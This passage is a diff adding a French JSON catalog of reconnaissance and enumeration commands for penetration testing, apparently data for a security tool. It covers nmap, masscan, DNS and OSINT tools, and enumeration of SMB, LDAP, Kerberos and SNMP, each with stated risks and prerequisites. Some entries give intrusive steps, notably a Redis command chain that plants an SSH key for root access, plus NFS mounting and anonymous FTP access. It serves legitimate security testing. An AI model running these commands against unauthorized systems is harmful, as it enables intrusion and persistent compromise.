@@ -1,0 +1,1077 @@
+{
+  "label": "Reconnaissance & Scan",
+  "icon": "🔭",
+  "commands": [
+    {
+      "id": "rec_001",
+      "name": "Nmap — scan rapide",
+      "short_name": "nmap -T4",
+      "description": "Scan les 1000 ports TCP les plus courants avec timing agressif",
+      "command": "nmap -T4 -F $TARGET",
+      "purpose": "Identifier rapidement les services exposés sur une cible. Idéal pour une première cartographie.",
+      "expected_output": "Liste des ports ouverts avec service associé (ssh, http, ftp…)",
+      "risks": "Génère du trafic réseau détectable par IDS/IPS",
+      "prerequisites": [
+        "nmap installé",
+        "Autorisation de scanner la cible"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "nmap",
+        "scan",
+        "ports",
+        "tcp",
+        "reconnaissance"
+      ]
+    },
+    {
+      "id": "rec_002",
+      "name": "Nmap — détection OS + version",
+      "short_name": "nmap -A",
+      "description": "Détecte OS, version des services, scripts par défaut et traceroute",
+      "command": "sudo nmap -A -T4 $TARGET",
+      "purpose": "Obtenir un profil complet de la cible : OS, versions logiciels, fingerprinting.",
+      "expected_output": "OS estimé, versions exactes des services, résultats scripts NSE",
+      "risks": "Très bruyant — facilement détecté. Requiert sudo pour détection OS.",
+      "prerequisites": [
+        "nmap installé",
+        "Droits sudo",
+        "Autorisation de scanner"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": true,
+      "category": "recon",
+      "tags": [
+        "nmap",
+        "os",
+        "version",
+        "fingerprint",
+        "reconnaissance"
+      ]
+    },
+    {
+      "id": "rec_003",
+      "name": "Nmap — scan tous ports",
+      "short_name": "nmap -p-",
+      "description": "Scanne les 65535 ports TCP (plus lent mais exhaustif)",
+      "command": "nmap -p- --min-rate 5000 -T4 $TARGET",
+      "purpose": "Trouver des services cachés sur des ports non-standard (ex: SSH sur 2222, HTTP sur 8080).",
+      "expected_output": "Tous les ports TCP ouverts sur la machine cible",
+      "risks": "Long à exécuter — peut déclencher des alertes. Générer --min-rate trop élevé peut manquer des ports.",
+      "prerequisites": [
+        "nmap installé",
+        "Patience (plusieurs minutes)"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "nmap",
+        "ports",
+        "full",
+        "tcp",
+        "scan"
+      ]
+    },
+    {
+      "id": "rec_004",
+      "name": "Nmap — scripts vuln",
+      "short_name": "nmap --script vuln",
+      "description": "Lance les scripts NSE de détection de vulnérabilités connues",
+      "command": "sudo nmap --script vuln -sV $TARGET",
+      "purpose": "Détecter automatiquement des vulnérabilités connues (EternalBlue, Shellshock, HeartBleed…).",
+      "expected_output": "Liste des CVE potentiellement présentes sur la cible",
+      "risks": "Certains scripts sont intrusifs et peuvent crasher des services fragiles.",
+      "prerequisites": [
+        "nmap installé",
+        "Droits sudo",
+        "Scripts NSE à jour (nmap --script-updatedb)"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": true,
+      "category": "recon",
+      "tags": [
+        "nmap",
+        "vuln",
+        "cve",
+        "scripts",
+        "nse"
+      ]
+    },
+    {
+      "id": "rec_005",
+      "name": "Masscan — scan ultra-rapide",
+      "short_name": "masscan",
+      "description": "Scanner de ports extrêmement rapide (millions de paquets/s)",
+      "command": "sudo masscan -p1-65535 $TARGET --rate=10000",
+      "purpose": "Scanner de grands réseaux (/16, /8) en quelques minutes. Plus rapide que nmap.",
+      "expected_output": "Ports ouverts détectés (sans version ni OS)",
+      "risks": "Peut saturer la connexion réseau. Très visible dans les logs. Requiert sudo.",
+      "prerequisites": [
+        "masscan installé",
+        "Droits sudo"
+      ],
+      "tool_required": "masscan",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": true,
+      "category": "recon",
+      "tags": [
+        "masscan",
+        "scan",
+        "ports",
+        "rapide",
+        "réseau"
+      ]
+    },
+    {
+      "id": "rec_006",
+      "name": "Whois — infos domaine",
+      "short_name": "whois",
+      "description": "Récupère les informations d'enregistrement d'un domaine",
+      "command": "whois $DOMAIN",
+      "purpose": "OSINT : trouver registrar, contacts admin, dates d'expiration, NS. Point de départ de toute recon.",
+      "expected_output": "Registrar, dates création/expiration, serveurs DNS, contacts techniques",
+      "risks": "Aucun risque — lecture seule via API publique",
+      "prerequisites": [
+        "whois installé (apt install whois)"
+      ],
+      "tool_required": "whois",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "whois",
+        "osint",
+        "domain",
+        "registrar"
+      ]
+    },
+    {
+      "id": "rec_007",
+      "name": "Dig — résolution DNS",
+      "short_name": "dig",
+      "description": "Interroge les enregistrements DNS d'un domaine (A, MX, NS, TXT…)",
+      "command": "dig $DOMAIN ANY +noall +answer",
+      "purpose": "Cartographier l'infrastructure DNS : serveurs mail, CDN, sous-domaines, SPF/DKIM.",
+      "expected_output": "Enregistrements A, MX, NS, TXT associés au domaine",
+      "risks": "Aucun risque — requêtes DNS publiques",
+      "prerequisites": [
+        "dig installé (apt install dnsutils)"
+      ],
+      "tool_required": "dig",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "dig",
+        "dns",
+        "mx",
+        "ns",
+        "a",
+        "txt",
+        "osint"
+      ]
+    },
+    {
+      "id": "rec_008",
+      "name": "DNSenum — énumération DNS",
+      "short_name": "dnsenum",
+      "description": "Énumère sous-domaines, transferts de zone et informations DNS",
+      "command": "dnsenum --dnsserver 8.8.8.8 --enum -p 0 -s 0 $DOMAIN",
+      "purpose": "Découvrir des sous-domaines non référencés, tester le transfert de zone (AXFR).",
+      "expected_output": "Sous-domaines découverts, IPs associées, éventuels transferts de zone",
+      "risks": "Génère de nombreuses requêtes DNS — peut être détecté / bloqué",
+      "prerequisites": [
+        "dnsenum installé"
+      ],
+      "tool_required": "dnsenum",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "dns",
+        "subdomain",
+        "zone-transfer",
+        "enumeration"
+      ]
+    },
+    {
+      "id": "rec_009",
+      "name": "TheHarvester — OSINT emails",
+      "short_name": "theHarvester",
+      "description": "Collecte emails, sous-domaines, IPs via moteurs de recherche publics",
+      "command": "theHarvester -d $DOMAIN -b google,bing,duckduckgo -l 200",
+      "purpose": "Trouver des adresses email d'employés, sous-domaines exposés et IPs associées à une organisation.",
+      "expected_output": "Emails, sous-domaines, hôtes, IPs découverts via OSINT",
+      "risks": "Requiert des API keys pour certaines sources. Résultats limités sans clés.",
+      "prerequisites": [
+        "theHarvester installé (pip install theHarvester ou Kali)"
+      ],
+      "tool_required": "theHarvester",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "osint",
+        "email",
+        "subdomain",
+        "theharvester",
+        "google"
+      ]
+    },
+    {
+      "id": "rec_010",
+      "name": "Enum4linux — SMB énumération",
+      "short_name": "enum4linux",
+      "description": "Énumère les partages SMB, utilisateurs et groupes Windows/Samba",
+      "command": "enum4linux -a $TARGET",
+      "purpose": "Sur un réseau Windows : découvrir les partages accessibles, les utilisateurs, la politique de mots de passe.",
+      "expected_output": "Workgroup, partages SMB, liste utilisateurs, politique mdp, OS info",
+      "risks": "Génère du trafic SMB — détectable. Peut échouer si SMB signé.",
+      "prerequisites": [
+        "enum4linux installé",
+        "Port 139/445 ouvert sur la cible"
+      ],
+      "tool_required": "enum4linux",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "smb",
+        "windows",
+        "samba",
+        "enum",
+        "shares",
+        "users"
+      ]
+    },
+    {
+      "id": "rec_011",
+      "name": "Nmap — scan UDP",
+      "short_name": "nmap -sU",
+      "description": "Scanne les ports UDP (DNS 53, SNMP 161, NTP 123…)",
+      "command": "sudo nmap -sU --top-ports 100 $TARGET",
+      "purpose": "Trouver des services UDP souvent oubliés : SNMP (communauté public), DNS, TFTP, NFS.",
+      "expected_output": "Ports UDP ouverts/filtrés avec services associés",
+      "risks": "Très lent. Peut générer des faux positifs (filtered ≠ closed).",
+      "prerequisites": [
+        "nmap installé",
+        "Droits sudo"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": true,
+      "category": "recon",
+      "tags": [
+        "nmap",
+        "udp",
+        "snmp",
+        "dns",
+        "scan"
+      ]
+    },
+    {
+      "id": "rec_012",
+      "name": "Sublist3r — sous-domaines",
+      "short_name": "sublist3r",
+      "description": "Énumère les sous-domaines d'un domaine via OSINT et brute-force DNS",
+      "command": "sublist3r -d $DOMAIN -o subdomains.txt",
+      "purpose": "Découvrir la surface d'attaque complète d'un domaine : sous-domaines exposés, APIs, panneaux admin.",
+      "expected_output": "Fichier subdomains.txt avec tous les sous-domaines découverts",
+      "risks": "Peut être détecté comme bot par certains services. Limites de rate sur les APIs.",
+      "prerequisites": [
+        "sublist3r installé (pip install sublist3r)"
+      ],
+      "tool_required": "sublist3r",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "subdomain",
+        "osint",
+        "dns",
+        "brute-force",
+        "sublist3r"
+      ]
+    },
+    {
+      "id": "rec_013",
+      "name": "Rustscan — découverte rapide de ports",
+      "short_name": "rustscan",
+      "description": "Découvre rapidement les ports ouverts puis délègue à Nmap pour l'identification",
+      "command": "rustscan -a $TARGET --ulimit 5000 -- -sV -Pn",
+      "purpose": "Gagner du temps sur les hôtes volumineux: Rustscan repère d'abord les ports ouverts, puis Nmap récupère les services et versions.",
+      "expected_output": "Ports ouverts détectés puis résultat Nmap -sV sur ces ports",
+      "risks": "Bruyant à haute vitesse. Peut déclencher des IDS/IPS sur la cible.",
+      "prerequisites": [
+        "rustscan installé",
+        "nmap installé"
+      ],
+      "tool_required": "rustscan",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "rustscan",
+        "ports",
+        "fast",
+        "recon",
+        "nmap"
+      ]
+    },
+    {
+      "id": "rec_014",
+      "name": "Amass — énumération passive de sous-domaines",
+      "short_name": "amass enum -passive",
+      "description": "Collecte des sous-domaines via des sources OSINT sans brute-force actif",
+      "command": "amass enum -passive -d $DOMAIN",
+      "purpose": "Étendre la cartographie d'un domaine en mode discret grâce à des sources publiques: certificats, moteurs de recherche et APIs.",
+      "expected_output": "Liste de sous-domaines trouvés pour le domaine ciblé",
+      "risks": "Faible risque réseau car mode passif, mais peut dépendre d'APIs externes et de quotas.",
+      "prerequisites": [
+        "amass installé"
+      ],
+      "tool_required": "amass",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "amass",
+        "osint",
+        "subdomains",
+        "recon",
+        "passive"
+      ]
+    },
+    {
+      "id": "rec_015",
+      "name": "SMBMap — énumérer partages SMB",
+      "short_name": "smbmap",
+      "description": "Liste les partages SMB accessibles et leurs permissions",
+      "command": "smbmap -H $TARGET -u $USER -p $PASS",
+      "purpose": "Identifier rapidement les partages SMB lisibles/écrivable sur une cible Windows ou Samba avec des credentials donnés.",
+      "expected_output": "Liste des shares avec droits READ/WRITE et chemins associés",
+      "risks": "Connexion authentifiée visible dans les logs SMB. Usage légal uniquement.",
+      "prerequisites": [
+        "smbmap installé",
+        "Credentials valides si accès authentifié"
+      ],
+      "tool_required": "smbmap",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "smbmap",
+        "smb",
+        "shares",
+        "windows",
+        "enumeration"
+      ]
+    },
+    {
+      "id": "rec_016",
+      "name": "Kerbrute — énumération d'utilisateurs AD",
+      "short_name": "kerbrute userenum",
+      "description": "Teste une liste d'utilisateurs Active Directory via Kerberos sans mot de passe",
+      "command": "kerbrute userenum --dc $TARGET -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+      "purpose": "Valider l'existence d'utilisateurs AD en s'appuyant sur les réponses Kerberos, utile avant password spray ou AS-REP roasting.",
+      "expected_output": "Liste des usernames valides trouvés sur le domaine",
+      "risks": "Peut générer des événements d'authentification et être détecté par le SIEM/EDR.",
+      "prerequisites": [
+        "kerbrute installé",
+        "DC accessible sur le port 88"
+      ],
+      "tool_required": "kerbrute",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "kerbrute",
+        "kerberos",
+        "active-directory",
+        "userenum",
+        "ad"
+      ]
+    },
+    {
+      "id": "rec_017",
+      "name": "Naabu — scan rapide de ports TCP",
+      "short_name": "naabu",
+      "description": "Découvre rapidement des ports TCP ouverts sur une cible unique",
+      "command": "naabu -host $TARGET -top-ports 1000",
+      "purpose": "Obtenir rapidement une première cartographie de ports avant d'enchaîner sur Nmap, httpx ou un workflow ProjectDiscovery.",
+      "expected_output": "Liste des ports ouverts détectés pour l'hôte ciblé",
+      "risks": "Bruyant selon le rythme du scan. Peut être détecté par IDS/IPS.",
+      "prerequisites": [
+        "naabu installé"
+      ],
+      "tool_required": "naabu",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "naabu",
+        "ports",
+        "projectdiscovery",
+        "recon",
+        "tcp"
+      ]
+    },
+    {
+      "id": "rec_018",
+      "name": "HTTPX — probe des services web",
+      "short_name": "httpx",
+      "description": "Teste des hôtes ou URLs et récupère les métadonnées HTTP utiles",
+      "command": "printf '%s\\n' $TARGET | httpx -title -tech-detect -status-code -follow-redirects",
+      "purpose": "Confirmer rapidement quels services exposent du HTTP/HTTPS, avec titre, techno détectée et code de retour.",
+      "expected_output": "URL valide avec code HTTP, titre et technologies détectées",
+      "risks": "Fait des requêtes HTTP directes sur la cible. Détectable côté serveur ou WAF.",
+      "prerequisites": [
+        "httpx installé"
+      ],
+      "tool_required": "httpx",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "recon",
+      "tags": [
+        "httpx",
+        "projectdiscovery",
+        "http",
+        "web",
+        "probe"
+      ]
+    },
+    {
+      "id": "rec_019",
+      "name": "Subfinder — sous-domaines passifs",
+      "short_name": "subfinder -silent",
+      "description": "Énumère des sous-domaines via des sources passives uniquement",
+      "command": "subfinder -d $DOMAIN -silent",
+      "purpose": "Obtenir rapidement une première liste de sous-domaines sans brute-force actif ni requêtes directes sur la cible.",
+      "expected_output": "Liste de sous-domaines passive sur stdout",
+      "risks": "Faible risque: dépend de sources externes et d'éventuelles limites d'API.",
+      "prerequisites": [
+        "subfinder installé"
+      ],
+      "tool_required": "subfinder",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "recon",
+      "tags": [
+        "subfinder",
+        "subdomains",
+        "passive",
+        "osint",
+        "projectdiscovery"
+      ]
+    },
+    {
+      "id": "rec_020",
+      "name": "DNSX — résolution DNS rapide",
+      "short_name": "dnsx -resp",
+      "description": "Résout un domaine et affiche ses réponses DNS principales",
+      "command": "printf '%s\\n' $DOMAIN | dnsx -resp -a -aaaa -cname -mx -ns -silent",
+      "purpose": "Valider rapidement la surface DNS d'un domaine avec un outil moderne de résolution et d'enrichissement.",
+      "expected_output": "Enregistrements A/AAAA/CNAME/MX/NS associés au domaine",
+      "risks": "Faible risque: requêtes DNS simples uniquement.",
+      "prerequisites": [
+        "dnsx installé"
+      ],
+      "tool_required": "dnsx",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "recon",
+      "tags": [
+        "dnsx",
+        "dns",
+        "resolve",
+        "projectdiscovery",
+        "records"
+      ]
+    },
+    {
+      "id": "rec_021",
+      "name": "LDAPSearch — RootDSE anonyme",
+      "short_name": "ldapsearch RootDSE",
+      "description": "Interroge les informations RootDSE d'un annuaire LDAP/AD sans modification",
+      "command": "ldapsearch -x -H ldap://$TARGET -s base -b '' namingcontexts defaultnamingcontext rootdomainnamingcontext",
+      "purpose": "Découvrir rapidement les contextes LDAP et la structure de base d'un annuaire Active Directory ou LDAP.",
+      "expected_output": "namingContexts, defaultNamingContext, rootDomainNamingContext",
+      "risks": "Faible risque: simple lecture LDAP, visible côté contrôleur de domaine.",
+      "prerequisites": [
+        "ldap-utils installé",
+        "Port 389 accessible"
+      ],
+      "tool_required": "ldapsearch",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "recon",
+      "tags": [
+        "ldapsearch",
+        "ldap",
+        "rootdse",
+        "ad",
+        "enumeration"
+      ]
+    },
+    {
+      "id": "rec_022",
+      "name": "OpenSSL — bannière TLS distante",
+      "short_name": "openssl s_client",
+      "description": "Récupère les premières informations d'un service TLS distant",
+      "command": "echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null | head -30",
+      "purpose": "Voir rapidement le certificat présenté, le protocole négocié et quelques détails TLS sans audit intrusif.",
+      "expected_output": "Chaîne de certificat, protocole, cipher et sujet du certificat",
+      "risks": "Faible risque: une négociation TLS simple.",
+      "prerequisites": [
+        "openssl installé",
+        "Port 443 ou autre port TLS accessible"
+      ],
+      "tool_required": "openssl",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "recon",
+      "tags": [
+        "openssl",
+        "tls",
+        "certificate",
+        "banner",
+        "recon"
+      ]
+    },
+    {
+      "id": "rec_023",
+      "name": "Nmap — scripts smb-vuln",
+      "short_name": "nmap smb-vuln",
+      "description": "Détecte EternalBlue/MS17-010, MS08-067, MS06-025",
+      "command": "sudo nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms06-025 $TARGET",
+      "purpose": "Détecter les vulnérabilités SMB classiques sur la cible",
+      "expected_output": "VULNERABLE ou Host script results",
+      "risks": "Élevé — scan intrusif, peut crasher des hôtes fragiles",
+      "prerequisites": [
+        "nmap installé",
+        "port 445 ouvert"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": true,
+      "tags": [
+        "smb",
+        "vuln",
+        "eternalblue",
+        "windows",
+        "nmap"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_024",
+      "name": "SNMP Walk — énumération complète",
+      "short_name": "snmpwalk",
+      "description": "Dump OID complet d'un équipement via SNMP v1/v2c",
+      "command": "snmpwalk -v2c -c public $TARGET",
+      "purpose": "Extraire la configuration complète via SNMP community string par défaut",
+      "expected_output": "Liste d'OID et valeurs système",
+      "risks": "Moyen — lecture passive mais peut révéler configs sensibles",
+      "prerequisites": [
+        "snmp-utils installé",
+        "community string connue"
+      ],
+      "tool_required": "snmpwalk",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "snmp",
+        "recon",
+        "network",
+        "iot"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_025",
+      "name": "ShowMount — partages NFS exposés",
+      "short_name": "showmount",
+      "description": "Liste les exports NFS disponibles sur la cible",
+      "command": "showmount -e $TARGET",
+      "purpose": "Identifier les partages NFS montables sans authentification",
+      "expected_output": "Export list for TARGET: /share *",
+      "risks": "Moyen — révèle les partages NFS, potentiel accès aux fichiers",
+      "prerequisites": [
+        "nfs-common installé"
+      ],
+      "tool_required": "showmount",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "nfs",
+        "recon",
+        "network",
+        "linux"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_026",
+      "name": "Monter un partage NFS",
+      "short_name": "mount nfs",
+      "description": "Monte un partage NFS découvert sur /mnt/nfs",
+      "command": "sudo mount -t nfs $TARGET:/share /mnt/nfs -o nolock",
+      "purpose": "Accéder au contenu d'un partage NFS non protégé",
+      "expected_output": "Montage silencieux — ls /mnt/nfs affiche le contenu",
+      "risks": "Élevé — accès direct aux fichiers du serveur",
+      "prerequisites": [
+        "showmount -e $TARGET exécuté",
+        "répertoire /mnt/nfs créé"
+      ],
+      "tool_required": "mount",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": true,
+      "tags": [
+        "nfs",
+        "mount",
+        "lateral",
+        "linux"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_027",
+      "name": "FTP — connexion anonyme",
+      "short_name": "ftp anonymous",
+      "description": "Teste l'accès FTP anonyme et liste le contenu",
+      "command": "ftp -n $TARGET <<EOF\nquote USER anonymous\nquote PASS anonymous@\nls -la\nbye\nEOF",
+      "purpose": "Vérifier si le serveur FTP accepte l'authentification anonyme",
+      "expected_output": "230 Login successful + liste des fichiers",
+      "risks": "Moyen — accès anonyme potentiel à des fichiers sensibles",
+      "prerequisites": [
+        "port 21 ouvert"
+      ],
+      "tool_required": "ftp",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "ftp",
+        "recon",
+        "anonymous",
+        "network"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_028",
+      "name": "SMTP — enum utilisateurs VRFY",
+      "short_name": "smtp vrfy",
+      "description": "Énumère les utilisateurs via la commande VRFY du serveur SMTP",
+      "command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET",
+      "purpose": "Identifier les comptes valides sur un serveur mail",
+      "expected_output": "EXISTS: root@TARGET, EXISTS: admin@TARGET",
+      "risks": "Moyen — peut déclencher des alertes de sécurité sur le serveur",
+      "prerequisites": [
+        "smtp-user-enum installé",
+        "port 25 ouvert"
+      ],
+      "tool_required": "smtp-user-enum",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "smtp",
+        "email",
+        "enum",
+        "users"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_029",
+      "name": "RPCClient — enum SMB anonyme",
+      "short_name": "rpcclient",
+      "description": "Énumère utilisateurs, groupes et SIDs via RPC null session",
+      "command": "rpcclient -U '' -N $TARGET -c 'enumdomusers;enumdomgroups;querydominfo'",
+      "purpose": "Extraire les utilisateurs AD via une session RPC anonyme",
+      "expected_output": "user:[Administrator] rid:[0x1f4]",
+      "risks": "Élevé — révèle la structure AD complète",
+      "prerequisites": [
+        "smbclient/rpcclient installé",
+        "null session autorisée"
+      ],
+      "tool_required": "rpcclient",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "rpc",
+        "smb",
+        "ad",
+        "windows",
+        "enum"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_030",
+      "name": "Redis — accès sans auth",
+      "short_name": "redis-cli info",
+      "description": "Teste un serveur Redis exposé sans authentification",
+      "command": "redis-cli -h $TARGET INFO server",
+      "purpose": "Vérifier si Redis est accessible sans mot de passe",
+      "expected_output": "redis_version, config_file, os: Linux",
+      "risks": "Élevé — Redis sans auth permet lecture/écriture arbitraire, RCE possible",
+      "prerequisites": [
+        "redis-tools installé",
+        "port 6379 ouvert"
+      ],
+      "tool_required": "redis-cli",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "redis",
+        "database",
+        "noauth",
+        "rce"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_031",
+      "name": "Redis — écriture de clé SSH (RCE)",
+      "short_name": "redis ssh rce",
+      "description": "Injecte une clé SSH publique via Redis pour obtenir un accès root",
+      "command": "redis-cli -h $TARGET config set dir /root/.ssh && redis-cli -h $TARGET config set dbfilename authorized_keys && redis-cli -h $TARGET set pwn \"\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n\" && redis-cli -h $TARGET save",
+      "purpose": "Obtenir un accès SSH root via Redis mal configuré (CVE classique)",
+      "expected_output": "OK OK OK OK — puis ssh root@$TARGET fonctionne",
+      "risks": "Critique — RCE + persistance root sur la cible",
+      "prerequisites": [
+        "clé SSH locale générée",
+        "Redis accessible sans auth en root"
+      ],
+      "tool_required": "redis-cli",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "redis",
+        "rce",
+        "ssh",
+        "persistence",
+        "root"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_032",
+      "name": "Eyewitness — screenshots web",
+      "short_name": "eyewitness",
+      "description": "Prend des captures d'écran de toutes les cibles web",
+      "command": "eyewitness --web -f targets.txt --timeout 10 -d eyewitness_output",
+      "purpose": "Identifier visuellement les services web exposés sur un réseau",
+      "expected_output": "Rapport HTML avec screenshots de chaque service",
+      "risks": "Faible — requêtes HTTP GET passives",
+      "prerequisites": [
+        "eyewitness installé",
+        "fichier targets.txt avec URLs"
+      ],
+      "tool_required": "eyewitness",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "web",
+        "screenshot",
+        "recon",
+        "visual"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_033",
+      "name": "Netdiscover — découverte ARP réseau",
+      "short_name": "netdiscover arp",
+      "description": "Découverte passive des hôtes sur le réseau local via ARP",
+      "command": "sudo netdiscover -r 192.168.1.0/24 -P",
+      "purpose": "Cartographier les hôtes actifs sur le réseau local",
+      "expected_output": "IP / MAC Address / Count / Len / MAC Vendor",
+      "risks": "Moyen — trafic ARP actif visible sur le réseau",
+      "prerequisites": [
+        "netdiscover installé",
+        "accès réseau local"
+      ],
+      "tool_required": "netdiscover",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": true,
+      "tags": [
+        "arp",
+        "discovery",
+        "network",
+        "lan"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_034",
+      "name": "Impacket — mssqlclient probe",
+      "short_name": "mssqlclient",
+      "description": "Connexion et probe d'un serveur MSSQL",
+      "command": "python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py $DOMAIN/$USER:$PASS@$TARGET -windows-auth",
+      "purpose": "Accéder à un serveur MSSQL avec des credentials obtenus",
+      "expected_output": "SQL> — prompt interactif MSSQL",
+      "risks": "Élevé — accès base de données, xp_cmdshell permet RCE",
+      "prerequisites": [
+        "impacket installé",
+        "port 1433 ouvert",
+        "credentials valides"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "mssql",
+        "database",
+        "windows",
+        "impacket",
+        "rce"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_035",
+      "name": "Nmap — scan Kubernetes",
+      "short_name": "nmap k8s",
+      "description": "Détecte l'API Kubernetes exposée et kubelet",
+      "command": "nmap -p 6443,8443,10250,10255,2379,2380 --script ssl-cert $TARGET",
+      "purpose": "Identifier les composants Kubernetes exposés sur le réseau",
+      "expected_output": "PORT STATE SERVICE — 6443 (api-server), 10250 (kubelet)",
+      "risks": "Élevé — API k8s exposée = compromission cluster",
+      "prerequisites": [
+        "nmap installé"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "kubernetes",
+        "k8s",
+        "cloud",
+        "recon",
+        "api"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_036",
+      "name": "Nmap — scan Docker daemon",
+      "short_name": "nmap docker",
+      "description": "Détecte le daemon Docker exposé sur TCP 2375/2376",
+      "command": "nmap -p 2375,2376 --script ssl-cert,docker-version $TARGET",
+      "purpose": "Identifier un Docker daemon accessible sans TLS",
+      "expected_output": "2375/tcp open docker-api — version: xx",
+      "risks": "Critique — Docker sans TLS = root sur l'hôte",
+      "prerequisites": [
+        "nmap installé"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "docker",
+        "container",
+        "recon",
+        "rce"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_037",
+      "name": "CrackMapExec — SMB recon réseau",
+      "short_name": "cme smb recon",
+      "description": "Scan SMB d'un subnet complet — OS, hostname, signing",
+      "command": "crackmapexec smb 192.168.1.0/24",
+      "purpose": "Cartographier les machines Windows sur le réseau local",
+      "expected_output": "SMB TARGET 445 HOSTNAME [*] Windows 10 x64 (signing:False)",
+      "risks": "Moyen — connexion SMB active visible dans les logs",
+      "prerequisites": [
+        "crackmapexec installé"
+      ],
+      "tool_required": "crackmapexec",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "smb",
+        "windows",
+        "ad",
+        "network",
+        "recon"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_038",
+      "name": "Nmap — broadcast DHCP discover",
+      "short_name": "nmap dhcp",
+      "description": "Envoie un DHCP discover pour identifier les serveurs DHCP",
+      "command": "sudo nmap --script broadcast-dhcp-discover -e $INTERFACE",
+      "purpose": "Identifier le serveur DHCP et les ranges d'IP du réseau",
+      "expected_output": "Router: 192.168.1.1, Domain Name Server: ...",
+      "risks": "Faible — broadcast passif",
+      "prerequisites": [
+        "nmap installé",
+        "interface réseau"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": true,
+      "tags": [
+        "dhcp",
+        "network",
+        "discovery",
+        "broadcast"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_039",
